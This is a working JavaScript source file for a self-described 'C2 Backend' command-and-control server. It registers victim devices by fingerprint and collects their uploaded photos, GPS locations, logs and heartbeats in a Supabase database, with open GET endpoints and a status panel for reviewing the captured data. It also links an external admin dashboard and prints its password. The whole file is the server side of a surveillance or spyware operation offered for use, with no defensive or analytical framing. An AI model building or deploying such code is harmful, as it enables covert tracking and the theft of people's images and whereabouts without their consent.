// ============================================================
//  INDEX.JS — Landing Page + All API Routes
//  This file handles:
//  - /                → Landing page
//  - /api/register    → Register device
//  - /api/photo       → Upload photo
//  - /api/log         → Add log
//  - /api/location    → Add location
//  - /api/heartbeat   → Heartbeat
//  - /api/devices     → List devices
//  - /api/photos      → Get photos
//  - /api/logs        → Get logs
//  - /api/locations   → Get locations
// ============================================================

const { createClient } = require('@supabase/supabase-js');

// ============================================================
//  SUPABASE CLIENT
// ============================================================
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_ANON_KEY;

let supabase = null;
if (supabaseUrl && supabaseKey) {
    supabase = createClient(supabaseUrl, supabaseKey);
    console.log('[Boot] Supabase connected');
} else {
    console.log('[Boot] Supabase NOT configured');
}

// ============================================================
//  CORS HELPER
// ============================================================
function setCors(res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

// ============================================================
//  MAIN HANDLER
// ============================================================
module.exports = async (req, res) => {
    setCors(res);

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const url = new URL(req.url, `http://${req.headers.host}`);
    const path = url.pathname;

    console.log(`[${req.method}] ${path}`);

    // ============================================================
    //  ROOT — LANDING PAGE
    // ============================================================
    if (path === '/') {
        res.setHeader('Content-Type', 'text/html');
        return res.send(`<!DOCTYPE html>
<html>
<head><title>C2 Backend</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{background:linear-gradient(145deg,#14141f,#1e1e30);border-radius:32px;padding:48px 40px;max-width:500px;width:100%;border:1px solid #2a2a44;text-align:center}
h1{font-size:28px;background:linear-gradient(90deg,#f7971e,#ffd200);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px}
.sub{color:#8a8aaa;font-size:14px;margin-bottom:24px}
.btn{display:inline-block;padding:14px 32px;background:linear-gradient(90deg,#f7971e,#ffd200);border-radius:60px;color:#0a0a12;font-weight:700;text-decoration:none;margin:6px}
.btn:hover{transform:scale(1.02)}
.btn-secondary{background:rgba(42,42,68,0.6);color:#e0e0e0;border:1px solid rgba(42,42,68,0.4)}
.footer{font-size:11px;color:#4a4a6a;margin-top:20px}
.endpoints{text-align:left;margin-top:20px;padding:16px;background:rgba(11,11,20,0.5);border-radius:16px;font-size:12px;color:#4a6a7a;font-family:'Courier New',monospace;line-height:1.8}
.endpoints .highlight{color:#88ccff}
</style>
</head>
<body>
<div class="card">
    <h1>☠️ C2 Backend</h1>
    <p class="sub">Command & Control Server — Running</p>
    <a href="/api/test" class="btn">📊 Status Panel</a>
    <a href="https://angeljangra.github.io/dashboard/dashboard.html" target="_blank" class="btn btn-secondary">📱 Dashboard</a>
    <div class="endpoints">
        <div><span class="highlight">POST</span> /api/register</div>
        <div><span class="highlight">POST</span> /api/photo</div>
        <div><span class="highlight">POST</span> /api/log</div>
        <div><span class="highlight">POST</span> /api/location</div>
        <div><span class="highlight">POST</span> /api/heartbeat</div>
        <div><span class="highlight">GET</span> /api/devices</div>
        <div><span class="highlight">GET</span> /api/photos?deviceId=xxx</div>
        <div><span class="highlight">GET</span> /api/logs?deviceId=xxx</div>
        <div><span class="highlight">GET</span> /api/locations?deviceId=xxx</div>
        <div><span class="highlight">GET</span> /api/test</div>
    </div>
    <p class="footer">🔐 Dashboard password: infected</p>
</div>
</body>
</html>`);
    }

    // ============================================================
    //  API: /api/register
    // ============================================================
    if (path === '/api/register' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { fingerprint, permissions } = req.body || {};
        if (!fingerprint) return res.status(400).json({ error: 'Missing fingerprint' });

        const deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
        const { error } = await supabase.from('devices').insert([{
            id: deviceId,
            ip: fingerprint.ip || 'unknown',
            platform: fingerprint.platform || 'unknown',
            screen: fingerprint.screen || 'unknown',
            timezone: fingerprint.timezone || 'unknown',
            cpu_cores: fingerprint.cpuCores || 'unknown',
            memory: fingerprint.deviceMemory || 'unknown',
            canvas_fp: fingerprint.canvasFingerprint || 'unknown',
            first_seen: Date.now(),
            last_seen: Date.now(),
            permissions: JSON.stringify(permissions || {})
        }]);
        if (error) return res.status(500).json({ error: error.message });
        return res.json({ success: true, deviceId });
    }

    // ============================================================
    //  API: /api/photo
    // ============================================================
    if (path === '/api/photo' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, image, timestamp } = req.body || {};
        if (!deviceId || !image) return res.status(400).json({ error: 'Missing deviceId or image' });

        try {
            let storagePath = null, filePath = null;
            try {
                const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
                const ext = image.match(/^data:image\/(\w+);/)?.[1] || 'jpg';
                const fileName = `${deviceId}_${Date.now()}.${ext}`;
                const { error } = await supabase.storage.from('photos').upload(fileName, Buffer.from(base64Data, 'base64'), {
                    contentType: `image/${ext}`,
                    cacheControl: '3600'
                });
                if (!error) {
                    storagePath = fileName;
                    const { data } = supabase.storage.from('photos').getPublicUrl(fileName);
                    filePath = data?.publicUrl || null;
                }
            } catch (e) { console.error('Storage error:', e); }

            const { error } = await supabase.from('photos').insert([{
                device_id: deviceId,
                timestamp: timestamp || Date.now(),
                data_url: storagePath ? null : image.substring(0, 100),
                storage_path: storagePath,
                file_path: filePath
            }]);
            if (error) return res.status(500).json({ error: error.message });
            await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
            return res.json({ success: true, storagePath, filePath });
        } catch (e) {
            return res.status(500).json({ error: e.message });
        }
    }

    // ============================================================
    //  API: /api/log
    // ============================================================
    if (path === '/api/log' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, msg, level } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { error } = await supabase.from('logs').insert([{
            device_id: deviceId,
            timestamp: Date.now(),
            level: level || 'info',
            message: msg || ''
        }]);
        if (error) return res.status(500).json({ error: error.message });
        return res.json({ success: true });
    }

    // ============================================================
    //  API: /api/location
    // ============================================================
    if (path === '/api/location' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, lat, lon, timestamp } = req.body || {};
        if (!deviceId || lat === undefined || lon === undefined) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        const { error } = await supabase.from('locations').insert([{
            device_id: deviceId,
            timestamp: timestamp || Date.now(),
            lat, lon
        }]);
        if (error) return res.status(500).json({ error: error.message });
        await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
        return res.json({ success: true });
    }

    // ============================================================
    //  API: /api/heartbeat
    // ============================================================
    if (path === '/api/heartbeat' && req.method === 'POST') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { deviceId, timestamp } = req.body || {};
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { error } = await supabase.from('heartbeats').insert([{
            device_id: deviceId,
            timestamp: timestamp || Date.now()
        }]);
        if (error) return res.status(500).json({ error: error.message });
        await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
        return res.json({ success: true });
    }

    // ============================================================
    //  API: /api/devices (GET)
    // ============================================================
    if (path === '/api/devices' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const { data, error } = await supabase.from('devices').select('*').order('first_seen', { ascending: false });
        if (error) return res.status(500).json({ error: error.message });
        return res.json(data || []);
    }

    // ============================================================
    //  API: /api/photos (GET)
    // ============================================================
    if (path === '/api/photos' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { data, error } = await supabase.from('photos').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false });
        if (error) return res.status(500).json({ error: error.message });
        const result = (data || []).map(p => {
            if (p.storage_path) {
                const { data: urlData } = supabase.storage.from('photos').getPublicUrl(p.storage_path);
                return { ...p, publicUrl: urlData?.publicUrl || null };
            }
            return p;
        });
        return res.json(result);
    }

    // ============================================================
    //  API: /api/logs (GET)
    // ============================================================
    if (path === '/api/logs' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { data, error } = await supabase.from('logs').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(200);
        if (error) return res.status(500).json({ error: error.message });
        return res.json(data || []);
    }

    // ============================================================
    //  API: /api/locations (GET)
    // ============================================================
    if (path === '/api/locations' && req.method === 'GET') {
        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
        const deviceId = url.searchParams.get('deviceId');
        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
        const { data, error } = await supabase.from('locations').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(100);
        if (error) return res.status(500).json({ error: error.message });
        return res.json(data || []);
    }

    // ============================================================
    //  API: /api/test — MODERN STATUS PANEL
    // ============================================================
    if (path === '/api/test') {
        res.setHeader('Content-Type', 'text/html');
        res.setHeader('Cache-Control', 'no-cache');

        // Run tests
        let supabaseStatus = '❌ Not Configured';
        let deviceCount = 0;
        let bucketExists = false;
        let tables = { devices: '⏳', photos: '⏳', logs: '⏳', locations: '⏳', heartbeats: '⏳' };
        let recentDevices = [];
        let recentActivity = { photo: null, log: null, location: null };
        let error = null;

        if (supabase) {
            try {
                const { data, error: e } = await supabase.from('devices').select('count', { count: 'exact', head: true });
                if (e) { error = e.message; supabaseStatus = '❌ Error'; } else {
                    supabaseStatus = '✅ Connected';
                    deviceCount = data?.length || 0;
                }
            } catch (e) { error = e.message; supabaseStatus = '❌ Exception'; }
        }

        if (supabase && !error) {
            try {
                const { data: buckets } = await supabase.storage.listBuckets();
                bucketExists = buckets?.some(b => b.name === 'photos') || false;
            } catch (e) {}
        }

        if (supabase && !error) {
            const tableNames = ['devices', 'photos', 'logs', 'locations', 'heartbeats'];
            for (const t of tableNames) {
                try {
                    const { error: e } = await supabase.from(t).select('count', { count: 'exact', head: true });
                    tables[t] = e ? '❌' : '✅';
                } catch { tables[t] = '❌'; }
            }
        }

        if (supabase && !error) {
            try {
                const { data } = await supabase.from('devices').select('id, ip, platform, last_seen').order('last_seen', { ascending: false }).limit(5);
                recentDevices = data || [];
            } catch (e) {}
        }

        if (supabase && !error) {
            try {
                const { data: p } = await supabase.from('photos').select('device_id, timestamp').order('timestamp', { ascending: false }).limit(1);
                recentActivity.photo = p?.length > 0 ? p[0] : null;
                const { data: l } = await supabase.from('logs').select('device_id, message, timestamp').order('timestamp', { ascending: false }).limit(1);
                recentActivity.log = l?.length > 0 ? l[0] : null;
                const { data: loc } = await supabase.from('locations').select('device_id, lat, lon, timestamp').order('timestamp', { ascending: false }).limit(1);
                recentActivity.location = loc?.length > 0 ? loc[0] : null;
            } catch (e) {}
        }

        const allGreen = supabaseStatus === '✅ Connected' && bucketExists && Object.values(tables).every(v => v === '✅');

        return res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Status</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;background-image:radial-gradient(ellipse at 50% 0%,#1a1a2e 0%,#0a0a12 70%)}
        .container{width:100%;max-width:900px;animation:fadeUp 0.5s ease}
        @keyframes fadeUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
        .header{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:16px;margin-bottom:28px;padding:16px 24px;background:rgba(20,20,31,0.5);backdrop-filter:blur(20px);border-radius:20px;border:1px solid rgba(42,42,68,0.3)}
        .header h1{font-size:24px;font-weight:700;background:linear-gradient(135deg,#f7971e,#ffd200);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:flex;align-items:center;gap:10px}
        .header h1 span{font-size:28px;-webkit-text-fill-color:initial;color:#ff3b3b}
        .badge{padding:4px 16px;border-radius:60px;font-size:12px;font-weight:600}
        .badge.success{background:rgba(26,42,26,0.6);color:#6fcf97;border:1px solid rgba(42,74,42,0.4)}
        .badge.warning{background:rgba(42,42,26,0.6);color:#ffaa44;border:1px solid rgba(74,74,42,0.4)}
        .badge.error{background:rgba(42,26,26,0.6);color:#ff5e5e;border:1px solid rgba(74,42,42,0.4)}
        .dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
        .dot.green{background:#6fcf97}
        .dot.yellow{background:#ffaa44}
        .dot.red{background:#ff5e5e}
        .time{color:#4a6a7a;font-size:13px;font-family:'Courier New',monospace}
        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:16px;margin-bottom:20px}
        .card{background:rgba(20,20,31,0.5);backdrop-filter:blur(20px);border-radius:16px;padding:18px 20px;border:1px solid rgba(42,42,68,0.3)}
        .card:hover{border-color:rgba(247,151,30,0.2);transform:translateY(-2px)}
        .card .label{font-size:11px;text-transform:uppercase;letter-spacing:0.5px;color:#4a6a7a;margin-bottom:4px}
        .card .value{font-size:18px;font-weight:600;display:flex;align-items:center;gap:8px}
        .card .sub{font-size:12px;color:#4a6a7a;margin-top:4px}
        .card-full{grid-column:1/-1}
        .table-wrap{overflow-x:auto;margin-top:6px}
        .table-wrap table{width:100%;border-collapse:collapse;font-size:13px}
        .table-wrap th{text-align:left;color:#4a6a7a;font-weight:600;font-size:11px;text-transform:uppercase;padding:6px 8px;border-bottom:1px solid rgba(42,42,68,0.2)}
        .table-wrap td{padding:6px 8px;border-bottom:1px solid rgba(42,42,68,0.1);color:#aab}
        .table-wrap td .status-icon{font-size:16px}
        .table-wrap tr:hover td{background:rgba(255,255,255,0.02)}
        .code{font-family:'Courier New',monospace;color:#88ccff}
        .footer-text{text-align:center;margin-top:24px;font-size:11px;color:#4a4a6a}
        .footer-text a{color:#88ccff;text-decoration:none}
        .footer-text a:hover{text-decoration:underline}
        .refresh-link{color:#4a6a7a;text-decoration:none;font-size:13px;border:1px solid rgba(42,42,68,0.3);padding:4px 14px;border-radius:60px;display:inline-block}
        .refresh-link:hover{background:rgba(42,42,68,0.3)}
        @media(max-width:600px){.grid{grid-template-columns:1fr}.header{flex-direction:column;text-align:center}.time{text-align:center}}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1><span>☠️</span> System Status</h1>
        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
            <span class="badge ${allGreen ? 'success' : 'warning'}">
                <span class="dot ${allGreen ? 'green' : 'yellow'}"></span>
                ${allGreen ? 'All Systems Ready' : 'Some Issues Detected'}
            </span>
            <span class="time">🕒 ${new Date().toLocaleString()}</span>
            <a href="/api/test" class="refresh-link">↻ Refresh</a>
        </div>
    </div>

    <div class="grid">
        <div class="card">
            <div class="label">📦 Supabase</div>
            <div class="value"><span>${supabaseStatus.includes('✅') ? '🟢' : '🔴'}</span> ${supabaseStatus}</div>
            <div class="sub">${deviceCount > 0 ? `${deviceCount} devices registered` : 'No devices yet'}</div>
            ${error ? `<div class="sub" style="color:#ff5e5e;">${error}</div>` : ''}
        </div>
        <div class="card">
            <div class="label">📁 Storage Bucket</div>
            <div class="value"><span>${bucketExists ? '🟢' : '🔴'}</span> ${bucketExists ? 'photos ✅' : 'photos ❌'}</div>
        </div>
        <div class="card">
            <div class="label">📱 Devices</div>
            <div class="value">${recentDevices.length}</div>
            <div class="sub">Registered devices</div>
        </div>
        <div class="card">
            <div class="label">⚡ Recent Activity</div>
            <div style="font-size:13px;color:#aab;margin-top:4px;line-height:1.8;">
                ${recentActivity.photo ? `📸 ${new Date(recentActivity.photo.timestamp).toLocaleTimeString()}` : 'No photos yet'}<br>
                ${recentActivity.log ? `📋 ${new Date(recentActivity.log.timestamp).toLocaleTimeString()}` : ''}<br>
                ${recentActivity.location ? `📍 ${new Date(recentActivity.location.timestamp).toLocaleTimeString()}` : ''}
            </div>
        </div>
    </div>

    <div class="card card-full">
        <div class="label">🗄️ Database Tables</div>
        <div class="table-wrap">
            <table>
                <thead><tr><th>Table</th><th>Status</th></tr></thead>
                <tbody>
                    ${Object.entries(tables).map(([name, status]) => `
                        <tr><td><span class="code">${name}</span></td><td><span class="status-icon">${status === '✅' ? '🟢' : '🔴'}</span> ${status}</td></tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
    </div>

    <div class="card card-full">
        <div class="label">📋 Recent Devices</div>
        ${recentDevices.length > 0 ? `
        <div class="table-wrap">
            <table>
                <thead><tr><th>IP</th><th>Platform</th><th>Last Seen</th></tr></thead>
                <tbody>
                    ${recentDevices.map(d => `
                        <tr><td><span class="code">${d.ip || 'unknown'}</span></td><td>${d.platform || 'unknown'}</td><td style="color:#4a6a7a;">${new Date(d.last_seen).toLocaleString()}</td></tr>
                    `).join('')}
                </tbody>
            </table>
        </div>
        ` : `<div style="color:#4a6a7a;padding:12px 0;">No devices registered yet.</div>`}
    </div>

    <div class="card card-full">
        <div class="label">🔗 Available Endpoints</div>
        <div style="display:flex;flex-wrap:wrap;gap:4px 16px;padding:8px 0;font-size:13px;color:#4a6a7a;font-family:'Courier New',monospace;">
            <div><span style="color:#88ccff;">POST</span> /api/register</div>
            <div><span style="color:#88ccff;">POST</span> /api/photo</div>
            <div><span style="color:#88ccff;">POST</span> /api/log</div>
            <div><span style="color:#88ccff;">POST</span> /api/location</div>
            <div><span style="color:#88ccff;">POST</span> /api/heartbeat</div>
            <div><span style="color:#6fcf97;">GET</span> /api/devices</div>
            <div><span style="color:#6fcf97;">GET</span> /api/photos?deviceId=xxx</div>
            <div><span style="color:#6fcf97;">GET</span> /api/logs?deviceId=xxx</div>
            <div><span style="color:#6fcf97;">GET</span> /api/locations?deviceId=xxx</div>
            <div><span style="color:#6fcf97;">GET</span> /api/test</div>
        </div>
    </div>

    <div class="footer-text">
        🔐 Dashboard: <a href="https://angeljangra.github.io/dashboard/dashboard.html" target="_blank">Open Admin Panel</a>
        &nbsp;·&nbsp; ⚡ C2 Backend v1.0
    </div>
</div>
</body>
</html>`);
    }

    // ============================================================
    //  404 — NOT FOUND
    // ============================================================
    return res.status(404).json({
        error: 'Not Found',
        path: path,
        available: [
            '/', '/api/register', '/api/photo', '/api/log',
            '/api/location', '/api/heartbeat', '/api/devices',
            '/api/photos?deviceId=xxx', '/api/logs?deviceId=xxx',
            '/api/locations?deviceId=xxx', '/api/test'
        ]
    });
};